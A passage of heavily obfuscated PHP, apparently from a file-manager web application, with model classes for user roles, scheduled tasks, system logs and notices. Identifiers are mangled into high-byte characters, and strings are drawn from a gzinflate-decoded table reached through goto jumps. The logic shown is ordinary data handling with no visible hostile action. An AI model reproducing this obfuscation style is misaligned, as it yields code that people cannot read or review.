$˜¨åÃËø[$¸Í‹Ãğ–][$º˜Òà·Ğ[493]] = LNG($º˜Òà·Ğ[2311]); } } } return $˜¨åÃËø; } public function update($ÜÖÏÈş„, $àÔ†ê¸³) { $¼‚Î‰¶ =& $_SERVER[™»È’øè]; $Šúş™ = parent::listData($ÜÖÏÈş„); $˜óöâ–Ô = $this->findByName($àÔ†ê¸³[$¼‚Î‰¶[32]]); if (!$Šúş™ || $˜óöâ–Ô && $˜óöâ–Ô[$¼‚Î‰¶[442]] != $Šúş™[$¼‚Î‰¶[442]]) { return !1; } if ($˜óöâ–Ô[$¼‚Î‰¶[2072]] == 1) { $àÔ†ê¸³ = array($¼‚Î‰¶[32] => $àÔ†ê¸³[$¼‚Î‰¶[32]], $¼‚Î‰¶[1893] => $àÔ†ê¸³[$¼‚Î‰¶[1893]]); } $this->filterAuth($àÔ†ê¸³[$¼‚Î‰¶[454]]); return parent::update($ÜÖÏÈş„, $àÔ†ê¸³); } public function remove($Ñ÷ù˜Â”) { $¾¬û·Œ‚ = parent::listData($Ñ÷ù˜Â”); if (!$¾¬û·Œ‚ || $¾¬û·Œ‚[$_SERVER[™»È’øè][178]]) { return !1; } return parent::remove($Ñ÷ù˜Â”); } public function add($îÄ®Ë¨§) { $¾¾¶ªÇÃ =& $_SERVER[™»È’øè]; $œîëçÄ = $îÄ®Ë¨§[$¾¾¶ªÇÃ[32]]; if ($this->findByName($œîëçÄ)) { return !1; } $ÔÚÈıÛÑ = array($¾¾¶ªÇÃ[461] => $œîëçÄ, $¾¾¶ªÇÃ[1876] => $¾¾¶ªÇÃ[12], $¾¾¶ªÇÃ[1872] => $¾¾¶ªÇÃ[1880], $¾¾¶ªÇÃ[2312] => 1, $¾¾¶ªÇÃ[1875] => 0, $¾¾¶ªÇÃ[2313] => 0, $¾¾¶ªÇÃ[1874] => $this->getSort()); $îÄ®Ë¨§ = array_merge($ÔÚÈıÛÑ, $îÄ®Ë¨§); $this->filterAuth($îÄ®Ë¨§[$¾¾¶ªÇÃ[454]]); return parent::insert($îÄ®Ë¨§); } private function getSort() { $úÈİ¥­æ =& $_SERVER[™»È’øè]; $öóÛÁ¸œ = parent::listData(); $Ÿâ£Á³ğ = array_to_keyvalue($öóÛÁ¸œ, $úÈİ¥­æ[12], $úÈİ¥­æ[1894]); return empty($Ÿâ£Á³ğ) ? 0 : max($Ÿâ£Á³ğ) + 1; } private function filterAuth(&$¦‘ŞÀöó) { $ùşô­ Æ =& $_SERVER[™»È’øè]; $Ï¦†Ú² = array(); $ƒÇ–ë¦‡ = array_filter(explode($ùşô­ Æ[50], $¦‘ŞÀöó)); foreach ($ƒÇ–ë¦‡ as $¦‘ŞÀöó) { $©ªåôÖ‡ = explode($ùşô­ Æ[10], $¦‘ŞÀöó); if ($©ªåôÖ‡[0] == $ùşô­ Æ[2314] && $©ªåôÖ‡[1] != $ùşô­ Æ[1220]) { $ã«Ì²ıã = $©ªåôÖ‡[0] . $ùşô­ Æ[10] . $©ªåôÖ‡[1] . $ùşô­ Æ[2315]; if (!in_array($ã«Ì²ıã, $ƒÇ–ë¦‡)) { $Ï¦†Ú²[] = $ã«Ì²ıã; } } $Ï¦†Ú²[] = $¦‘ŞÀöó; } $¦‘ŞÀöó = implode($ùşô­ Æ[50], $Ï¦†Ú²); } public function findRoleDefault() { $Ø§âğ· =& $_SERVER[™»È’øè]; $æìÁ¶ñÒ = parent::listData(); $†§¡¹  = !1; foreach ($æìÁ¶ñÒ as $é­ù¯í•) { if (!$é­ù¯í• || $é­ù¯í•[$Ø§âğ·[1892]] == $Ø§âğ·[211] || $é­ù¯í•[$Ø§âğ·[2072]] == 1) { continue; } if (strstr($é­ù¯í•[$Ø§âğ·[454]], $Ø§âğ·[2316])) { continue; } if (!strstr($é­ù¯í•[$Ø§âğ·[454]], $Ø§âğ·[2317])) { continue; } if (!$†§¡¹ ) { $†§¡¹  = $é­ù¯í•; continue; } $´ÙáÆ = explode($Ø§âğ·[50], $†§¡¹ [$Ø§âğ·[454]]); $ŞÃÎùÑÜ = explode($Ø§âğ·[50], $é­ù¯í•[$Ø§âğ·[454]]); if (count($´ÙáÆ) > count($ŞÃÎùÑÜ)) { $†§¡¹  = $é­ù¯í•; } } return $†§¡¹  ? $†§¡¹ [$Ø§âğ·[442]] : $Ø§âğ·[12]; } public function sort($°¾‹§’³, $¬óæğ“ ) { return parent::update($°¾‹§’³, $¬óæğ“ ); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\x53\x79\163\x74\x65\x6d\x2e\164\x61\x73\153\114\x69\163\x74"; public $field = array("\156\x61\155\x65", "\x74\171\x70\145", "\145\x76\145\156\164", "\164\151\x6d\x65", "\x64\145\163\143", "\x73\x79\x73\164\145\x6d", "\145\x6e\x61\x62\x6c\x65", "\154\x61\x73\x74\122\165\x6e", "\163\x6f\x72\x74"); public function listData($¯¦°¾©É = false, $êæâ­Öù = "\x73\157\x72\x74", $»ı­ƒÅú = false) { return parent::listData($¯¦°¾©É, $êæâ­Öù, $»ı­ƒÅú); } public function add($àÈá£ôÒ) { $£øÃÍ =& $_SERVER[™»È’øè]; $›ÉùıÉ = $this->findByName($àÈá£ôÒ[$£øÃÍ[32]]); if ($›ÉùıÉ) { return !1; } $àÈá£ôÒ[$£øÃÍ[1635]] = 0; $àÈá£ôÒ[$£øÃÍ[1894]] = $this->getSort(); return parent::insert($àÈá£ôÒ); } private function getSort() { $âØæ—û =& $_SERVER[™»È’øè]; $ü‘í¹ëú = parent::listData(); $¢ı±œ… = array_to_keyvalue($ü‘í¹ëú, $âØæ—û[12], $âØæ—û[1894]); return empty($¢ı±œ…) ? 0 : max($¢ı±œ…) + 1; } public function update($äáº, $Œªµ€°) { $õ³±úúØ =& $_SERVER[™»È’øè]; $ûåãúÏÂ = $this->listData($äáº); $º´éªìì = $this->findByName($Œªµ€°[$õ³±úúØ[32]]); if (!$ûåãúÏÂ || $º´éªìì && $º´éªìì[$õ³±úúØ[442]] != $ûåãúÏÂ[$õ³±úúØ[442]]) { return !1; } return parent::update($äáº, $Œªµ€°); } public function remove($ª¡Âıñ, $–¯¹®ÁÔ = false) { $ûÙ¬®ì½ =& $_SERVER[™»È’øè]; $‰Ô™Íú = $this->listData($ª¡Âıñ); if (!$‰Ô™Íú) { return; } if (!$–¯¹®ÁÔ && $‰Ô™Íú[$ûÙ¬®ì½[178]] == $ûÙ¬®ì½[88]) { return !1; } return parent::remove($ª¡Âıñ); } public function enable($Û÷Û·›¨, $·ììóîĞ) { return $this->update($Û÷Û·›¨, array($_SERVER[™»È’øè][2306] => $·ììóîĞ)); } public function run($Û‹«÷‡³) { return $this->update($Û‹«÷‡³, array($_SERVER[™»È’øè][2318] => time())); } } goto AëÅğ‡• ”; bºˆÄ·ƒ™¾: define($_SERVER[™»È’øè][0], $_SERVER[™»È’øè][1]); $_SERVER[Èå®§İæ] = explode($_SERVER[™»È’øè][2], gzinflate(substr($_SERVER[™»È’øè][3], 10, -8))); function binCheckEq($‰ïí«¢ı, $°¸Óâúª) { return $‰ïí«¢ı == $°¸Óâúª; } goto E®ªÄñŒø; eĞ™ãÉÕğ­: class SystemLogModel extends ModelBase { protected $tableName = "\x73\171\x73\x74\x65\155\x5f\x6c\157\x67"; protected $dataAuto = array(array("\x63\x72\x65\141\x74\x65\124\151\155\x65", "\164\x69\155\145", "\x69\156\x73\x65\162\164", "\x66\165\x6e\x63\164\151\157\x6e")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $º‰ÏÆø =& $_SERVER[™»È’øè]; return array($º‰ÏÆø[2206] => LNG($º‰ÏÆø[2207]), $º‰ÏÆø[2208] => LNG($º‰ÏÆø[2209]), $º‰ÏÆø[1813] => LNG($º‰ÏÆø[2210]), $º‰ÏÆø[2211] => LNG($º‰ÏÆø[2212]), $º‰ÏÆø[2213] => LNG($º‰ÏÆø[2214]), $º‰ÏÆø[2215] => LNG($º‰ÏÆø[2216]), $º‰ÏÆø[2217] => LNG($º‰ÏÆø[2218]), $º‰ÏÆø[1843] => LNG($º‰ÏÆø[2218]), $º‰ÏÆø[1844] => LNG($º‰ÏÆø[2219]), $º‰ÏÆø[2220] => LNG($º‰ÏÆø[2221]), $º‰ÏÆø[2222] => LNG($º‰ÏÆø[2223]), $º‰ÏÆø[2224] => LNG($º‰ÏÆø[2225]), $º‰ÏÆø[2226] => LNG($º‰ÏÆø[2227]), $º‰ÏÆø[1841] => LNG($º‰ÏÆø[2228]), $º‰ÏÆø[2229] => LNG($º‰ÏÆø[2230]), $º‰ÏÆø[1848] => LNG($º‰ÏÆø[2231]), $º‰ÏÆø[2232] => LNG($º‰ÏÆø[2233]), $º‰ÏÆø[2234] => LNG($º‰ÏÆø[2235]), $º‰ÏÆø[2236] => LNG($º‰ÏÆø[2237]), $º‰ÏÆø[2238] => LNG($º‰ÏÆø[2239]), $º‰ÏÆø[1851] => LNG($º‰ÏÆø[2240]), $º‰ÏÆø[1852] => LNG($º‰ÏÆø[2241]), $º‰ÏÆø[2242] => LNG($º‰ÏÆø[2243]), $º‰ÏÆø[2244] => LNG($º‰ÏÆø[2245]), $º‰ÏÆø[2246] => LNG($º‰ÏÆø[2247]), $º‰ÏÆø[1846] => LNG($º‰ÏÆø[2248]), $º‰ÏÆø[2249] => LNG($º‰ÏÆø[2250]), $º‰ÏÆø[1845] => LNG($º‰ÏÆø[2251]), $º‰ÏÆø[2252] => LNG($º‰ÏÆø[2253]), $º‰ÏÆø[2254] => LNG($º‰ÏÆø[2255]), $º‰ÏÆø[2256] => LNG($º‰ÏÆø[2257]), $º‰ÏÆø[2258] => LNG($º‰ÏÆø[2258]), $º‰ÏÆø[2259] => LNG($º‰ÏÆø[1817]), $º‰ÏÆø[2260] => LNG($º‰ÏÆø[2261]), $º‰ÏÆø[2262] => LNG($º‰ÏÆø[2263]), $º‰ÏÆø[2264] => LNG($º‰ÏÆø[2265]), $º‰ÏÆø[2266] => LNG($º‰ÏÆø[2267]), $º‰ÏÆø[2268] => LNG($º‰ÏÆø[2269]), $º‰ÏÆø[2270] => LNG($º‰ÏÆø[2270]), $º‰ÏÆø[2271] => LNG($º‰ÏÆø[2272]), $º‰ÏÆø[2273] => LNG($º‰ÏÆø[2274]), $º‰ÏÆø[2275] => LNG($º‰ÏÆø[2276]), $º‰ÏÆø[2277] => LNG($º‰ÏÆø[2278]), $º‰ÏÆø[2279] => LNG($º‰ÏÆø[2280]), $º‰ÏÆø[2281] => LNG($º‰ÏÆø[2282])); } private function typeFile() { $Ï«¯ëó =& $_SERVER[™»È’øè]; $ü¤—†íš = array($Ï«¯ëó[1848] => array($Ï«¯ëó[1849]), $Ï«¯ëó[2224] => array($Ï«¯ëó[2283]), $Ï«¯ëó[2226] => array($Ï«¯ëó[2284]), $Ï«¯ëó[1841] => array($Ï«¯ëó[1842], $Ï«¯ëó[2285]), $Ï«¯ëó[2234] => array(), $Ï«¯ëó[2236] => array(), $Ï«¯ëó[2238] => array(), $Ï«¯ëó[1851] => array($Ï«¯ëó[1853]), $Ï«¯ëó[1852] => array($Ï«¯ëó[1853]), $Ï«¯ëó[2242] => array($Ï«¯ëó[2286]), $Ï«¯ëó[2244] => array($Ï«¯ëó[2286]), $Ï«¯ëó[2246] => array($Ï«¯ëó[2287]), $Ï«¯ëó[2232] => array($Ï«¯ëó[2288]), $Ï«¯ëó[1846] => array($Ï«¯ëó[2289]), $Ï«¯ëó[2249] => array($Ï«¯ëó[2290]), $Ï«¯ëó[1845] => array($Ï«¯ëó[1847])); return $ü¤—†íš; } private function typeAll() { $«ïúıë =& $_SERVER[™»È’øè]; $ÆË¡ÆØ = $this->typeList; $¶€‰ £¼ = array_filter($this->typeFile()); foreach ($¶€‰ £¼ as $ÂÒº‰—Ü => $—ÖÖ·Şµ) { $ÆË¡ÆØ[$—ÖÖ·Şµ[0]] = $ÆË¡ÆØ[$ÂÒº‰—Ü]; } $ÆË¡ÆØ[$«ïúıë[1853]] = LNG($«ïúıë[2291]); $ÆË¡ÆØ[$«ïúıë[2286]] = LNG($«ïúıë[2292]); return $ÆË¡ÆØ; } public function addLog($Ò²»Ñ¤ù, $Òê”ğ¦Í = array()) { $åĞÙ Ùß =& $_SERVER[™»È’øè]; if (!isset($this->typeList[$Ò²»Ñ¤ù])) { return; } $˜½·ÍóÁ = isset($Òê”ğ¦Í[$åĞÙ Ùß[1678]]) ? $Òê”ğ¦Í[$åĞÙ Ùß[1678]] : 0; if (!$˜½·ÍóÁ) { $˜½·ÍóÁ = Session::get($åĞÙ Ùß[2007]); } if ($Ò²»Ñ¤ù == $åĞÙ Ùß[2260] && is_array($Òê”ğ¦Í[$åĞÙ Ùß[2293]]) && !$Òê”ğ¦Í[$åĞÙ Ùß[2293]]) { return; } $òÒµ”„æ = get_client_ip(); if (!$Òê”ğ¦Í || strlen(json_encode($Òê”ğ¦Í)) >= 1024) { $Òê”ğ¦Í = array($åĞÙ Ùß[2294] => $òÒµ”„æ); } else { if (is_array($Òê”ğ¦Í)) { $Òê”ğ¦Í[$åĞÙ Ùß[2294]] = $òÒµ”„æ; } else { $Òê”ğ¦Í = array($åĞÙ Ùß[1232] => $Òê”ğ¦Í, $åĞÙ Ùß[2294] => $òÒµ”„æ); } } $Òê”ğ¦Í = array($åĞÙ Ùß[1668] => Session::sign(), $åĞÙ Ùß[1669] => intval($˜½·ÍóÁ), $åĞÙ Ùß[33] => $Ò²»Ñ¤ù, $åĞÙ Ùß[1671] => json_encode($Òê”ğ¦Í)); parent::add($Òê”ğ¦Í); } public function remove($›×ß¯ÎÊ) { $this->where(array($_SERVER[™»È’øè][460] => $›×ß¯ÎÊ))->delete(); } private function _makeOrder($ Ü¨÷„â = '') { $£²ŞÛÕÍ =& $_SERVER[™»È’øè]; $ÂŸê®Í‰ = $£²ŞÛÕÍ[214]; $†ûş†á© = array($£²ŞÛÕÍ[490] => $£²ŞÛÕÍ[491], $£²ŞÛÕÍ[492] => $£²ŞÛÕÍ[493]); $í‡º³­ = Input::get($£²ŞÛÕÍ[498], $£²ŞÛÕÍ[7], $£²ŞÛÕÍ[2043], array($£²ŞÛÕÍ[1961], $£²ŞÛÕÍ[492])); $í‡º³­ = $†ûş†á©[$í‡º³­]; $ Ü¨÷„â = $ Ü¨÷„â . "{$ÂŸê®Í‰}\40{$í‡º³­}"; return $this->order($ Ü¨÷„â); } public function get($ÆˆÉ¸âƒ = '') { $úàÒ”ºù =& $_SERVER[™»È’øè]; if (!$ÆˆÉ¸âƒ) { show_json(array()); } $÷‘—µ = array(); if ($ÆˆÉ¸âƒ[$úàÒ”ºù[1678]]) { $÷‘—µ[$úàÒ”ºù[1678]] = $ÆˆÉ¸âƒ[$úàÒ”ºù[1678]]; } if (isset($ÆˆÉ¸âƒ[$úàÒ”ºù[785]])) { $ÏÑß¯ë„ = $ÆˆÉ¸âƒ[$úàÒ”ºù[785]]; $áğ´•© = isset($ÆˆÉ¸âƒ[$úàÒ”ºù[786]]) ? $ÆˆÉ¸âƒ[$úàÒ”ºù[786]] : time(); $÷‘—µ[$úàÒ”ºù[214]] = array($úàÒ”ºù[376], array($ÏÑß¯ë„, $áğ´•©)); } if ($ÆˆÉ¸âƒ[$úàÒ”ºù[33]]) { $Æå½¡öª = explode($úàÒ”ºù[50], $ÆˆÉ¸âƒ[$úàÒ”ºù[33]]); $‚õÌÄê = $this->typeFile(); $’Ë’¶·¼ = array(); foreach ($Æå½¡öª as $‡êŸ¶Ñ„) { $’Ë’¶·¼[] = $‡êŸ¶Ñ„; if (isset($‚õÌÄê[$‡êŸ¶Ñ„])) { $’Ë’¶·¼ = array_merge($’Ë’¶·¼, $‚õÌÄê[$‡êŸ¶Ñ„]); } } $’Ë’¶·¼ = array_unique($’Ë’¶·¼); if ($’Ë’¶·¼) { $÷‘—µ[$úàÒ”ºù[33]] = array($úàÒ”ºù[7], $’Ë’¶·¼); } } else { $÷‘—µ[$úàÒ”ºù[33]] = array($úàÒ”ºù[2295], $úàÒ”ºù[2296]); } if (!empty($ÆˆÉ¸âƒ[$úàÒ”ºù[2294]])) { $÷‘—µ[$úàÒ”ºù[493]] = array($úàÒ”ºù[426], "\x25{$ÆˆÉ¸âƒ[$úàÒ”ºù[2294]]}\x25"); } $å–÷÷‡Š = $this->_makeOrder()->where($÷‘—µ)->selectPage(); if (empty($å–÷÷‡Š[$úàÒ”ºù[412]])) { show_json(array(), !0, $å–÷÷‡Š[$úàÒ”ºù[409]]); } $å–÷÷‡Š[$úàÒ”ºù[412]] = $this->logList($å–÷÷‡Š[$úàÒ”ºù[412]]); return $å–÷÷‡Š; } private function ipAddress(&$ßûéºÖÄ) { $ŠØœÄŠ· =& $_SERVER[™»È’øè]; if (!empty($ßûéºÖÄ[$ŠØœÄŠ·[2294]])) { $È«İ¹Ó§ = IpLocation::get($ßûéºÖÄ[$ŠØœÄŠ·[2294]]); } else { $È«İ¹Ó§ = LNG($ŠØœÄŠ·[2297]); } $ßûéºÖÄ[$ŠØœÄŠ·[2298]] = $È«İ¹Ó§; } private function descZipDownload($í•Íé¢ù, &$€ÆËø²Í) { $ôïóï£š =& $_SERVER[™»È’øè]; if (!isset($í•Íé¢ù[$ôïóï£š[2299]])) { return; } $·‡Ş‡ì„ = json_decode($í•Íé¢ù[$ôïóï£š[2299]], !0); foreach ($·‡Ş‡ì„ as $ë½’ñ½) { try { $®ó‚‚’Ø = IO::infoFullSimple($ë½’ñ½[$ôïóï£š[84]]); } catch (Exception $¸€àä˜Ğ) { continue; } $í•Íé¢ù[$ôïóï£š[84]] = $ë½’ñ½[$ôïóï£š[84]]; $€ÆËø²Í[] = $í•Íé¢ù[$ôïóï£š[180]] = $®ó‚‚’Ø[$ôïóï£š[180]]; $€ÆËø²Í[] = $í•Íé¢ù[$ôïóï£š[2098]] = $®ó‚‚’Ø[$ôïóï£š[179]]; break; } return $í•Íé¢ù; } private function getSourceList(&$’­´‹•ñ) { $Ïâˆ€òÒ =& $_SERVER[™»È’øè]; $€úç¨İ¦ = array(); foreach ($’­´‹•ñ as $éÈå¿Ìì => $©™’¦´İ) { $ŠÙÏ¬ˆ = json_decode($©™’¦´İ[$Ïâˆ€òÒ[493]], !0); if ($©™’¦´İ[$Ïâˆ€òÒ[33]] == $Ïâˆ€òÒ[1844]) { $ŠÙÏ¬ˆ = $this->descZipDownload($ŠÙÏ¬ˆ, $€úç¨İ¦); $’­´‹•ñ[$éÈå¿Ìì][$Ïâˆ€òÒ[493]] = json_encode($ŠÙÏ¬ˆ); continue; } if (strpos($©™’¦´İ[$Ïâˆ€òÒ[33]], $Ïâˆ€òÒ[2100]) !== 0) { if (!isset($ŠÙÏ¬ˆ[$Ïâˆ€òÒ[84]]) || strpos($©™’¦´İ[$Ïâˆ€òÒ[33]], $Ïâˆ€òÒ[2300]) !== 0) { continue; } try { $Ãëø³Ñ‰ = IO::infoFullSimple($ŠÙÏ¬ˆ[$Ïâˆ€òÒ[84]]); } catch (Exception $¢ÀƒËº¤) { continue; } $€úç¨İ¦[] = $ŠÙÏ¬ˆ[$Ïâˆ€òÒ[180]] = $Ãëø³Ñ‰[$Ïâˆ€òÒ[180]]; $€úç¨İ¦[] = $ŠÙÏ¬ˆ[$Ïâˆ€òÒ[2098]] = $Ãëø³Ñ‰[$Ïâˆ€òÒ[179]]; $’­´‹•ñ[$éÈå¿Ìì][$Ïâˆ€òÒ[493]] = json_encode($ŠÙÏ¬ˆ); continue; } $€úç¨İ¦[] = $ŠÙÏ¬ˆ[$Ïâˆ€òÒ[180]]; $€úç¨İ¦[] = $ŠÙÏ¬ˆ[$Ïâˆ€òÒ[2098]]; if ($ŠÙÏ¬ˆ[$Ïâˆ€òÒ[33]] == $Ïâˆ€òÒ[587]) { $€úç¨İ¦[] = $ŠÙÏ¬ˆ[$Ïâˆ€òÒ[493]][$Ïâˆ€òÒ[1190]]; $€úç¨İ¦[] = $ŠÙÏ¬ˆ[$Ïâˆ€òÒ[493]][$Ïâˆ€òÒ[1191]]; } if ($ŠÙÏ¬ˆ[$Ïâˆ€òÒ[33]] == $Ïâˆ€òÒ[2108]) { $€úç¨İ¦[] = $ŠÙÏ¬ˆ[$Ïâˆ€òÒ[493]][$Ïâˆ€òÒ[180]]; } } if (!$€úç¨İ¦) { return array(); } return Model($Ïâˆ€òÒ[850])->sourceListInfo($€úç¨İ¦, !0); } private function logList($ÄŸá£ãÒ) { $ñÜÈ·Ù£ =& $_SERVER[™»È’øè]; $Ù‡æ¿ı = array_to_keyvalue($ÄŸá£ãÒ, $ñÜÈ·Ù£[12], $ñÜÈ·Ù£[1678]); $ùùÏí‹ê = Model($ñÜÈ·Ù£[566])->userListInfo(array_unique($Ù‡æ¿ı)); $«ãıöë“ = $this->getSourceList($ÄŸá£ãÒ); $ÙÃ­¬ = $this->typeAll(); $ù¶¯§¶Ü = array(); $”Ìåó = array(); foreach ($ÄŸá£ãÒ as $­À‡ÀÂ› => $œ…òÈ—‘) { $÷‚Ú¾ôÖ = $œ…òÈ—‘[$ñÜÈ·Ù£[33]]; $¿Ï‡ÀÑĞ = isset($ùùÏí‹ê[$œ…òÈ—‘[$ñÜÈ·Ù£[1678]]]) ? $ùùÏí‹ê[$œ…òÈ—‘[$ñÜÈ·Ù£[1678]]] : !1; $Ş¼‚—Í„ = strpos($÷‚Ú¾ôÖ, $ñÜÈ·Ù£[2301]) === 0 ? LNG($ñÜÈ·Ù£[2302]) : LNG($ñÜÈ·Ù£[2297]); $œ…òÈ—‘[$ñÜÈ·Ù£[32]] = isset($¿Ï‡ÀÑĞ[$ñÜÈ·Ù£[32]]) ? $¿Ï‡ÀÑĞ[$ñÜÈ·Ù£[32]] : LNG($ñÜÈ·Ù£[2297]); $œ…òÈ—‘[$ñÜÈ·Ù£[2152]] = isset($¿Ï‡ÀÑĞ[$ñÜÈ·Ù£[2152]]) ? $¿Ï‡ÀÑĞ[$ñÜÈ·Ù£[2152]] : $ñÜÈ·Ù£[12]; $œ…òÈ—‘[$ñÜÈ·Ù£[1573]] = isset($ÙÃ­¬[$÷‚Ú¾ôÖ]) ? $ÙÃ­¬[$÷‚Ú¾ôÖ] : $Ş¼‚—Í„; $œ…òÈ—‘[$ñÜÈ·Ù£[2042]] = $¿Ï‡ÀÑĞ; $µ„ÎÙÃÊ = json_decode($œ…òÈ—‘[$ñÜÈ·Ù£[493]], !0); $œ…òÈ—‘[$ñÜÈ·Ù£[2294]] = isset($µ„ÎÙÃÊ[$ñÜÈ·Ù£[2294]]) ? $µ„ÎÙÃÊ[$ñÜÈ·Ù£[2294]] : $ñÜÈ·Ù£[12]; $œ…òÈ—‘[$ñÜÈ·Ù£[2298]] = IpLocation::get($œ…òÈ—‘[$ñÜÈ·Ù£[2294]]); if (strpos($÷‚Ú¾ôÖ, $ñÜÈ·Ù£[2100]) === 0 || isset($µ„ÎÙÃÊ[$ñÜÈ·Ù£[2098]])) { $µ„ÎÙÃÊ[$ñÜÈ·Ù£[87]] = $«ãıöë“[$µ„ÎÙÃÊ[$ñÜÈ·Ù£[180]]]; $µ„ÎÙÃÊ[$ñÜÈ·Ù£[2113]] = $«ãıöë“[$µ„ÎÙÃÊ[$ñÜÈ·Ù£[2098]]]; if ($µ„ÎÙÃÊ[$ñÜÈ·Ù£[33]] == $ñÜÈ·Ù£[587]) { $µ„ÎÙÃÊ[$ñÜÈ·Ù£[493]][$ñÜÈ·Ù£[1190]] = $«ãıöë“[$µ„ÎÙÃÊ[$ñÜÈ·Ù£[493]][$ñÜÈ·Ù£[1190]]]; $µ„ÎÙÃÊ[$ñÜÈ·Ù£[493]][$ñÜÈ·Ù£[1191]] = $«ãıöë“[$µ„ÎÙÃÊ[$ñÜÈ·Ù£[493]][$ñÜÈ·Ù£[1191]]]; } if ($µ„ÎÙÃÊ[$ñÜÈ·Ù£[33]] == $ñÜÈ·Ù£[2108]) { $µ„ÎÙÃÊ[$ñÜÈ·Ù£[493]][$ñÜÈ·Ù£[180]] = $«ãıöë“[$µ„ÎÙÃÊ[$ñÜÈ·Ù£[493]][$ñÜÈ·Ù£[180]]]; } if ($µ„ÎÙÃÊ[$ñÜÈ·Ù£[33]] == $ñÜÈ·Ù£[1839]) { $µ„ÎÙÃÊ[$ñÜÈ·Ù£[2113]] = $µ„ÎÙÃÊ[$ñÜÈ·Ù£[87]]; $µ„ÎÙÃÊ[$ñÜÈ·Ù£[2098]] = $µ„ÎÙÃÊ[$ñÜÈ·Ù£[2113]][$ñÜÈ·Ù£[180]]; $µ„ÎÙÃÊ[$ñÜÈ·Ù£[87]] = !1; $µ„ÎÙÃÊ[$ñÜÈ·Ù£[180]] = $ñÜÈ·Ù£[12]; } if ($µ„ÎÙÃÊ[$ñÜÈ·Ù£[87]] && $µ„ÎÙÃÊ[$ñÜÈ·Ù£[87]][$ñÜÈ·Ù£[177]] == $ñÜÈ·Ù£[178]) { $”Ìåó[] = $œ…òÈ—‘[$ñÜÈ·Ù£[442]]; unset($ÄŸá£ãÒ[$­À‡ÀÂ›]); continue; } if ($µ„ÎÙÃÊ[$ñÜÈ·Ù£[2113]] && $µ„ÎÙÃÊ[$ñÜÈ·Ù£[2113]][$ñÜÈ·Ù£[177]] == $ñÜÈ·Ù£[178]) { $”Ìåó[] = $œ…òÈ—‘[$ñÜÈ·Ù£[442]]; unset($ÄŸá£ãÒ[$­À‡ÀÂ›]); continue; } } $œ…òÈ—‘[$ñÜÈ·Ù£[493]] = $µ„ÎÙÃÊ; unset($œ…òÈ—‘[$ñÜÈ·Ù£[2303]]); $ù¶¯§¶Ü[] = $œ…òÈ—‘; } $this->clearSystemPathLog($”Ìåó); return $ù¶¯§¶Ü; } private function clearSystemPathLog($¾ÜÌû‹é) { $îÚ’è‘Î =& $_SERVER[™»È’øè]; if (count($¾ÜÌû‹é) == 0) { return; } $¬ÌÖ½³‰ = array($îÚ’è‘Î[442] => array($îÚ’è‘Î[7], array_unique($¾ÜÌû‹é))); $this->where($¬ÌÖ½³‰)->delete(); } public function deviceList($œ…Œšøô, $åÎòˆœ = 0) { $†é÷ÆÁè =& $_SERVER[™»È’øè]; $Ö¡ƒÏÀÏ = array($†é÷ÆÁè[1678] => $œ…Œšøô, $†é÷ÆÁè[214] => array($†é÷ÆÁè[1044], $åÎòˆœ), $†é÷ÆÁè[33] => $†é÷ÆÁè[1813]); $éÏÑ¡±À = array(); $ØİÛ°­Ô = $this->field($†é÷ÆÁè[2304])->where($Ö¡ƒÏÀÏ)->order($†é÷ÆÁè[2111])->limit(50)->select(); foreach ($ØİÛ°­Ô as $ËŸôŸÍë => $è³Òû²) { if ($ËŸôŸÍë > 0 && abs($è³Òû²[$†é÷ÆÁè[214]] - $ØİÛ°­Ô[$ËŸôŸÍë - 1][$†é÷ÆÁè[214]]) < 5) { continue; } $±îÖ’– = json_decode($è³Òû²[$†é÷ÆÁè[493]], !0); $è³Òû²[$†é÷ÆÁè[2294]] = isset($±îÖ’–[$†é÷ÆÁè[2294]]) ? $±îÖ’–[$†é÷ÆÁè[2294]] : $†é÷ÆÁè[12]; unset($±îÖ’–[$†é÷ÆÁè[2294]]); $ÆÚšÃ¶è = $this->deviceType($±îÖ’–[$†é÷ÆÁè[2101]]); if (isset($éÏÑ¡±À[$ÆÚšÃ¶è])) { continue; } $è³Òû²[$†é÷ÆÁè[2298]] = IpLocation::get($è³Òû²[$†é÷ÆÁè[2294]]); $è³Òû²[$†é÷ÆÁè[493]] = $±îÖ’–; $éÏÑ¡±À[$ÆÚšÃ¶è] = $è³Òû²; } return array_values($éÏÑ¡±À); } public function deviceType($“é££ãÖ) { return $“é££ãÖ; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\123\171\163\x74\x65\155\56\x6e\x6f\164\151\143\145\x4c\151\163\164"; public $field = array("\156\141\x6d\145", "\x63\157\x6e\164\x65\156\164", "\x61\x75\164\150", "\155\x6f\144\x65", "\164\x69\x6d\145", "\x74\171\x70\x65", "\154\x65\166\x65\x6c", "\x65\156\141\142\x6c\145", "\163\157\x72\x74"); public function listData($„çÏÅ Ë = false, $šó’ØÌŞ = "\163\157\x72\164", $±Œæİ€£ = false) { return parent::listData($„çÏÅ Ë, $šó’ØÌŞ, $±Œæİ€£); } public function add($×ïï³) { $û©ÆÔü³ =& $_SERVER[™»È’øè]; $ãÆË¹í = time(); if ($×ïï³[$û©ÆÔü³[16]] == $û©ÆÔü³[2305]) { $ãÆË¹í = strtotime($×ïï³[$û©ÆÔü³[193]]); } $×ïï³[$û©ÆÔü³[193]] = $ãÆË¹í; return parent::insert($×ïï³); } public function update($Ñ÷‘Õ¥•, $¤œô´ø³) { $ğœ¢²Í  =& $_SERVER[™»È’øè]; $Î¢ÙÆ¨û = $this->listData($Ñ÷‘Õ¥•); if (!$Î¢ÙÆ¨û) { return !1; } $¶ô•á˜ = time(); if ($¤œô´ø³[$ğœ¢²Í [16]] == $ğœ¢²Í [2305]) { $¶ô•á˜ = strtotime($¤œô´ø³[$ğœ¢²Í [193]]); } $¤œô´ø³[$ğœ¢²Í [193]] = $¶ô•á˜; return parent::update($Ñ÷‘Õ¥•, $¤œô´ø³); } public function remove($ÄâÃÚ™®) { $×µÈò¬Æ = $this->listData($ÄâÃÚ™®); if (!$×µÈò¬Æ || $×µÈò¬Æ[$_SERVER[™»È’øè][178]]) { return !1; } return parent::remove($ÄâÃÚ™®); } public function sort($õÀààµß, $Óª¢®ÇÅ) { return parent::update($õÀààµß, $Óª¢®ÇÅ); } public function enable($ÚµÚ©€—, $áó™·Óñ) { return parent::update($ÚµÚ©€—, array($_SERVER[™»È’øè][2306] => $áó™·Óñ)); } private function initUserOption() { $§ò÷¾® =& $_SERVER[™»È’øè]; $this->optionType = 